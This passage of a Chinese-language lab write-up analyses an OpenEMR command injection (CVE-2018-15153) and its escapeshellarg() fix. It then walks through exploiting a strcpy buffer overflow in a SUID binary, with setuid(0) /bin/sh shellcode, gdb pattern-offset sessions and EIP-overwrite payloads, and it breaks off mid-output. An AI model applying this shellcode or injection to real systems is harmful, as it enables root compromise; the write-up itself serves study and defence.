&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;if (parent.left_nav.location) &#123;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  parent.left_nav.location.reload();&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  parent.Title.location.reload();&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  if(self.name==&#x27;RTop&#x27;)&#123;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  parent.RBot.location.reload();&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  &#125;else&#123;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  parent.RTop.location.reload();&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;  &#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;self.location.href=&#x27;edit_globals.php?unique=yes&#x27;;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端对传入的参数做的统一处理，仅去除了字符串两端的空白字符，然后利用
<code>sqlStatement()</code> 函数写入了数据库</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">……………………</span><br><span class="line"><span class="variable">$fldvalue</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&quot;form_<span class="subst">$i</span>&quot;</span>]);</span><br><span class="line">……………………</span><br><span class="line"><span class="title function_ invoke__">sqlStatement</span>(<span class="string">&#x27;INSERT INTO `globals` ( gl_name, gl_index, gl_value ) VALUES ( ?, ?, ? )&#x27;</span>, <span class="keyword">array</span>( <span class="variable">$fldid</span>, <span class="number">0</span>, <span class="variable">$fldvalue</span> ));</span><br><span class="line">……………………</span><br></pre></td></tr></table></figure>
<p>payload 是通过 form_284 参数写入的，进一步确定功能点</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221655601.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221655602.jpg" /></p>
<p>实际参数即为 <code>Hylafax Server</code> ，此时再看 payload 触发脚本
daemon_frame.php，相关代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">……………………</span><br><span class="line"> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;DAEMON_FLAG&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">include_once</span>(<span class="string">&quot;../globals.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$daemon_interval</span> = <span class="number">120</span>; <span class="comment">// Interval in seconds between reloads.</span></span><br><span class="line"> <span class="variable">$colorh</span> = <span class="string">&#x27;#ff0000&#x27;</span>;    <span class="comment">// highlight color</span></span><br><span class="line"> <span class="variable">$colorn</span> = <span class="string">&#x27;#000000&#x27;</span>;    <span class="comment">// normal color</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// Check if there are faxes in the recvq.</span></span><br><span class="line"> <span class="variable">$faxcount</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;enable_hylafax&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$statlines</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&quot;faxstat -r -l -h &quot;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&#x27;hylafax_server&#x27;</span>], <span class="variable">$statlines</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$statlines</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$line</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            ++<span class="variable">$faxcount</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">……………………</span><br></pre></td></tr></table></figure>
<p>也就是说，注入的 payload【<code>$GLOBALS['hylafax_server']</code>】被
<code>exec()</code> 函数直接执行了</p>
<h4 id="测试">3.1.2. 测试</h4>
<p>修改代码，输出写入数据库前 <code>$fldvalue</code> 的值和被
<code>exec()</code> 函数执行前
<code>$GLOBALS['hylafax_server']</code>的值，测试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221740715.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221740716.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221740718.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409221740719.jpg" /></p>
<p>可见测试与分析一致</p>
<h4 id="修复">3.1.3. 修复</h4>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-pcpw-qmpx-2hr8">OS
command injection occurring in versions of OpenEMR... · CVE-2018-15153 ·
GitHub Advisory Database · GitHub</a><br />
<a
target="_blank" rel="noopener" href="https://www.open-emr.org/wiki/index.php/Old_Outdated_OpenEMR_Patches#5.0.1_Patch_.281.2F19.2F19.29">Old
Outdated OpenEMR Patches - OpenEMR Project Wiki</a></p>
</blockquote>
<p>修改 daemon_frame.php 相关代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;enable_hylafax&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$statlines</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&quot;faxstat -r -l -h &quot;</span> . <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;hylafax_server&#x27;</span>]), <span class="variable">$statlines</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$statlines</span> <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$line</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">            ++<span class="variable">$faxcount</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>增加 <code>escapeshellarg()</code> 函数转义命令行参数
<code>$GLOBALS['hylafax_server']</code> ，避免命令注入攻击。</p>
<p><strong><code>escapeshellarg()</code> 函数功能</strong> -
<code>escapeshellarg()</code>
将给定的字符串作为命令行参数进行转义，使其在 shell 中安全使用。 -
它确保在命令执行过程中，传入的参数不会被误解析或执行。
<strong>转义处理</strong>： - <code>escapeshellarg()</code>
会在字符串的开头和结尾添加单引号，并对字符串中的任何单引号进行转义（即将其替换为
<code>'\''</code>）。 -
这可以防止字符串中的任何特殊字符（如空格、分号等）被误解析为命令或参数的分隔符。</p>
<h3 id="缓冲区溢出漏洞">3.2. 缓冲区溢出漏洞</h3>
<h4 id="关键代码">3.2.1. 关键代码</h4>
<p>IDA 反汇编 dontexecute，关键代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    vulnerable((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Usage: ./dontexecute argument&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">vulnerable</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">504</span>]; <span class="comment">// [esp+Ch] [ebp-1FCh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strcpy 函数复制字符串前未对源字符串长度做检查，若 src 长度超过 dest
长度则导致缓冲区溢出</p>
<h4 id="利用思路">3.2.2. 利用思路</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202409231106463.jpg" /></p>
<p>为此我们可以利用缓冲区溢出漏洞确定 EIP 地址，然后再将 EIP
地址覆盖以指向我们注入的 Shellcode 地址，注意，Shellcode
我们直接写入缓冲区了，可让 EIP 指向 NOP 区滑行至 Shellcode
执行恶意指令。</p>
<p>由于前面已经确定 dontexecute 有 SUID 权限，为此在 Shellcode
中可首先设置 setuid(0)，再调个bash，以获取 root 权限 shell</p>
<p>setuid（0）和 Aleph1 的著名的 Shellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh</span><br></pre></td></tr></table></figure>
<p>Shellcode - 2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><br></pre></td></tr></table></figure>
<h4 id="实操">3.2.3. 实操</h4>
<p>推荐安装 gdb 插件 <a target="_blank" rel="noopener" href="https://hugsy.github.io/gef/">GEF - GDB
Enhanced Features documentation</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># gdb -q ./dontexecute</span></span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">93 commands loaded and 5 <span class="built_in">functions</span> added <span class="keyword">for</span> GDB 15.1 <span class="keyword">in</span> 0.00ms using Python engine 3.12</span><br><span class="line">Reading symbols from ./dontexecute...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./dontexecute)</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>计算偏移量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">gef➤  pattern create</span><br><span class="line">[+] Generating a pattern of 1024 bytes (n=4)</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br><span class="line">[+] Saved as <span class="string">&#x27;$_gef0&#x27;</span></span><br><span class="line">gef➤  r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br><span class="line">Starting program: /root/Desktop/dontexecute aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x66616164 <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="variable">$eax</span>   : 0xffc6ce3c  →  <span class="string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;</span></span><br><span class="line"><span class="variable">$ebx</span>   : 0x66616162 (<span class="string">&quot;baaf&quot;</span>?)</span><br><span class="line"><span class="variable">$ecx</span>   : 0xffc6e2b0  →  <span class="string">&quot;kfaak&quot;</span></span><br><span class="line"><span class="variable">$edx</span>   : 0xffc6d237  →  <span class="string">&quot;kfaak&quot;</span></span><br><span class="line"><span class="variable">$esp</span>   : 0xffc6d040  →  <span class="string">&quot;eaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqa[...]&quot;</span></span><br><span class="line"><span class="variable">$ebp</span>   : 0x66616163 (<span class="string">&quot;caaf&quot;</span>?)</span><br><span class="line"><span class="variable">$esi</span>   : 0x5656b7c0  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7f74b80  →  0x00000000</span><br><span class="line"><span class="variable">$eip</span>   : 0x66616164 (<span class="string">&quot;daaf&quot;</span>?)</span><br><span class="line"><span class="variable">$eflags</span>: [zero carry PARITY adjust SIGN <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x23 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x2b <span class="variable">$es</span>: 0x2b <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x63 </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xffc6d040│+0x0000: <span class="string">&quot;eaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqa[...]&quot;</span>    ← <span class="variable">$esp</span></span><br><span class="line">0xffc6d044│+0x0004: <span class="string">&quot;faafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafra[...]&quot;</span></span><br><span class="line">0xffc6d048│+0x0008: <span class="string">&quot;gaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsa[...]&quot;</span></span><br><span class="line">0xffc6d04c│+0x000c: <span class="string">&quot;haafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaafta[...]&quot;</span></span><br><span class="line">0xffc6d050│+0x0010: <span class="string">&quot;iaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafua[...]&quot;</span></span><br><span class="line">0xffc6d054│+0x0014: <span class="string">&quot;jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafva[...]&quot;</span></span><br><span class="line">0xffc6d058│+0x0018: <span class="string">&quot;kaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwa[...]&quot;</span></span><br><span class="line">0xffc6d05c│+0x001c: <span class="string">&quot;laafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxa[...]&quot;</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span><br><span class="line">[!] Cannot disassemble from <span class="variable">$PC</span></span><br><span class="line">[!] Cannot access memory at address 0x66616164</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[<span class="comment">#0] Id 1, Name: &quot;dontexecute&quot;, stopped 0x66616164 in ?? (), reason: SIGSEGV</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>$eip 被 daaf 所覆盖</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$eip</span>   : 0x66616164 (<span class="string">&quot;daaf&quot;</span>?)</span><br></pre></td></tr></table></figure>
<p>确定偏移量为 512</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  pattern offset <span class="variable">$eip</span></span><br><span class="line">[+] Searching <span class="keyword">for</span> <span class="string">&#x27;64616166&#x27;</span>/<span class="string">&#x27;66616164&#x27;</span> with period=4</span><br><span class="line">[+] Found at offset 512 (little-endian search) likely</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试对 EIP 的覆盖</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">gef➤  r $(python3 -c <span class="string">&#x27;print(&quot;A&quot;*512 + &quot;B&quot;*4)&#x27;</span>)</span><br><span class="line">Starting program: /root/Desktop/dontexecute $(python3 -c <span class="string">&#x27;print(&quot;A&quot;*512 + &quot;B&quot;*4)&#x27;</span>)</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x42424242 <span class="keyword">in</span> ?? ()</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="variable">$eax</span>   : 0xff85876c  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span><br><span class="line"><span class="variable">$ebx</span>   : 0x41414141 (<span class="string">&quot;AAAA&quot;</span>?)</span><br><span class="line"><span class="variable">$ecx</span>   : 0xff85a2b0  →  <span class="string">&quot;ABBBB&quot;</span></span><br><span class="line"><span class="variable">$edx</span>   : 0xff85896b  →  <span class="string">&quot;ABBBB&quot;</span></span><br><span class="line"><span class="variable">$esp</span>   : 0xff858970  →  0xff85a000  →  0x00000000</span><br><span class="line"><span class="variable">$ebp</span>   : 0x41414141 (<span class="string">&quot;AAAA&quot;</span>?)</span><br><span class="line"><span class="variable">$esi</span>   : 0x5656b7c0  →  &lt;__libc_csu_init+0000&gt; push ebp</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7f91b80  →  0x00000000</span><br><span class="line"><span class="variable">$eip</span>   : 0x42424242 (<span class="string">&quot;BBBB&quot;</span>?)</span><br><span class="line"><span class="variable">$eflags</span>: [zero carry PARITY adjust SIGN <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x23 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x2b <span class="variable">$es</span>: 0x2b <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x63 </span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0xff858970│+0x0000: 0xff85a000  →  0x00000000    ← <span class="variable">$esp</span></span><br><span class="line">0xff858974│+0x0004: 0x00000001</span><br><span class="line">0xff858978│+0x0008: 0xf783c9a5  →  &lt;__cxa_atexit+0005&gt; add eax, 0x1e748f</span><br><span class="line">0xff85897c│+0x000c: 0x5656b6e2  →  &lt;main+0014&gt; add eax, 0x18e2</span><br><span class="line">0xff858980│+0x0010: 0xff8589a0  →  0x00000002</span><br><span class="line">0xff858984│+0x0014: 0xf7a23e34  →  0x00223d2c (<span class="string">&quot;,=&quot;</span><span class="string">&quot;?)</span></span><br><span class="line"><span class="string">0xff858988│+0x0018: 0x00000000</span></span><br><span class="line"><span class="string">0xff85898c│+0x001c: 0xf7823c65  →   add esp, 0x10</span></span><br><span class="line"><span class="string">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────</span></span><br><span class="line"><span class="string">[!] Cannot disassemble from <span class="variable">$PC</span></span></span><br><span class="line"><span class="string">[!] Cannot access memory at address 0x42424242</span></span><br><span class="line"><span class="string">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span></span><br><span class="line"><span class="string">[#0] Id 1, Name: &quot;</span>dontexecute<span class="string">&quot;, stopped 0x42424242 in ?? (), reason: SIGSEGV</span></span><br><span class="line"><span class="string">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span></span><br><span class="line"><span 